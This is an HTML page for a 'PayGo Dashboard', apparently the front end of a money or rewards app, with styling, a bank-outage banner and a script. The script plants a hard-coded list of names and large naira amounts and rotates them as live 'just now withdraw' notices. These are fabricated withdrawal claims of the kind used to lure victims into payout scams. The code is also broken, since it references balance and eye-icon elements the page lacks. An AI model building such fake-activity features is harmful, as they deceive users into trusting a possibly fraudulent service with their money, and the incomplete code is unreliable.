<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>PayGo Dashboard</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: #f7f0fc;
      color: #000;
    }
    .user-register-banner {
      background: #fff;
      border-bottom: 1px solid #ddd;
      text-align: center;
      padding: 8px;
      font-weight: 600;
      font-size: 14px;
      color: #444;
    }
    .header-card {
      background: #7c20e6;
      color: white;
      margin: 16px;
      border-radius: 12px;
      padding: 20px 24px;
      position: relative;
      box-shadow: 0 6px 10px rgb(124 32 230 / 0.5);
    }
    .header-top {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .header-top-left {
      display: flex;
      align-items: center;
    }
    .profile-circle {
      width: 40px;
      height: 40px;
      background: white;
      color: #7c20e6;
      font-weight: 700;
      font-size: 20px;
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
    }
    .header-greeting {
      font-weight: 600;
      font-size: 20px;
    }
    .header-greeting span {
      font-size: 22px;
    }
    .welcome-back {
      font-size: 14px;
      opacity: 0.75;
    }
    .notification-bell {
      background: rgba(255 255 255 / 0.2);
      border-radius: 50%;
      width: 38px;
      height: 38px;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      position: relative;
    }
    .notification-bell svg {
      fill: #fff;
      width: 22px;
      height: 22px;
    }
    .notification-bell .red-dot {
      width: 8px;
      height: 8px;
      background: #ff3838;
      border-radius: 50%;
      position: absolute;
      top: 8px;
      right: 8px;
    }
    .balance-label {
      margin-top: 18px;
      font-weight: 400;
      font-size: 15px;
      opacity: 0.85;
    }
    .balance-amount {
      font-weight: 700;
      font-size: 36px;
      margin-top: 6px;
      display: flex;
      align-items: center;
    }
    .currency {
      font-weight: 400;
      font-size: 24px;
      margin-right: 6px;
      text-decoration: line-through;
    }
    .weekly-rewards {
      margin-top: 6px;
      font-size: 13px;
      opacity: 0.75;
    }
    .eye-icon {
      cursor: pointer;
      margin-left: 12px;
    }
    .eye-icon svg {
      fill: #fff;
      width: 24px;
      height: 24px;
    }
    .header-buttons {
      margin-top: 24px;
      display: flex;
      gap: 20px;
    }
    .header-button {
      background: #9b4bf9;
      border-radius: 30px;
      padding: 10px 24px;
      font-weight: 600;
      font-size: 16px;
      color: white;
      cursor: pointer;
      border: none;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: background 0.25s ease;
    }
    .header-button:hover {
      background: #a463f8;
    }
    .header-button svg {
      fill: white;
      width: 18px;
      height: 18px;
    }
    .menu-grid {
      margin: 30px 20px 10px;
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 16px;
      text-align: center;
    }
    .menu-item {
      cursor: pointer;
      font-size: 13px;
      color: #222;
      user-select: none;
    }
    .menu-item svg, .menu-item img {
      width: 30px;
      height: 30px;
      margin-bottom: 8px;
      filter: drop-shadow(0 0 0.5px rgba(0,0,0,0.12));
    }
    .section-title {
      font-weight: 700;
      font-size: 20px;
      margin: 24px 20px 8px;
    }
    .carousel {
      margin: 0 20px 40px;
      border-radius: 12px;
      overflow: hidden;
    }
    .carousel img {
      width: 100%;
      display: block;
      border-radius: 12px;
    }
    @media (max-width: 480px) {
      .header-buttons {
        flex-direction: column;
        gap: 12px;
      }
      .menu-grid {
        grid-template-columns: repeat(3, 1fr);
      }
    }
  </style>
</head>
<body>

<div class="user-register-banner">
  <div class="announcement">
    <span class="announcement-text">⚡️ Important Announcements: The Opay bank service is currently experiencing issues. Please use other supported banks for your payment! ⚡️</span>
  </div>
</div>

<div id="announcement-bar" style="background:#fffbe6;padding:10px;text-align:center;display:none;font-weight:600;color:#333;">
  <div id="announcement-text" class="fade-slide"></div>
</div>

<style>
  .fade-slide {
    opacity: 0;
    transform: translateY(-10px);
    transition: opacity 0.6s ease, transform 0.6s ease;
  }
  .fade-slide.show {
    opacity: 1;
    transform: translateY(0);
  }
</style>

<script>
  if (!localStorage.getItem("withdrawals")) {
    localStorage.setItem("withdrawals", JSON.stringify([
      { name: "Arabmoney", amount: 180000 },
      { name: "maryam", amount: 90000 },
      { name: "sale", amount: 120000 },
      { name: "Ada", amount: 105000 },
      { name: "Emmanuel", amount: 190000 },
      { name: "sunday", amount: 150000 },
      { name: "liberty", amount: 100000 },
      { name: "sabastine", amount: 180000 },
      { name: "Adebayo", amount: 170000 }
    ]));
  }

  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
  if (w.length) {
    let i = 0;
    const bar = document.getElementById("announcement-bar");
    const text = document.getElementById("announcement-text");
    bar.style.display = "block";

    function showNext() {
      text.classList.remove("show");
      setTimeout(() => {
        let item = w[i];
        text.textContent = `${item.name.toUpperCase()} just now withdraw ₦${Number(item.amount).toLocaleString()}`;
        text.classList.add("show");
        i = (i + 1) % w.length;
      }, 300);
    }

    showNext();
    setInterval(showNext, 4000); // Every 4 seconds
  }

  // Toggle balance visibility
  let balanceVisible = true;
  const balanceAmount = document.getElementById("balance-amount");
  const eyeOpen = document.getElementById("eye-open");
  const eyeClosed = document.getElementById("eye-closed");
  const actualBalance = balanceAmount.innerText;

  function toggleBalanceVisibility() {
    if (balanceVisible) {
      balanceAmount.innerText = "•••••••";
      eyeOpen.style.display = "none";
      eyeClosed.style.display = "inline";
    } else {
      balanceAmount.innerText = actualBalance;
      eyeOpen.style.display = "inline";
      eyeClosed.style.display = "none";
    }
    balanceVisible = !balanceVisible;
  }
</script>

</body>
</html>
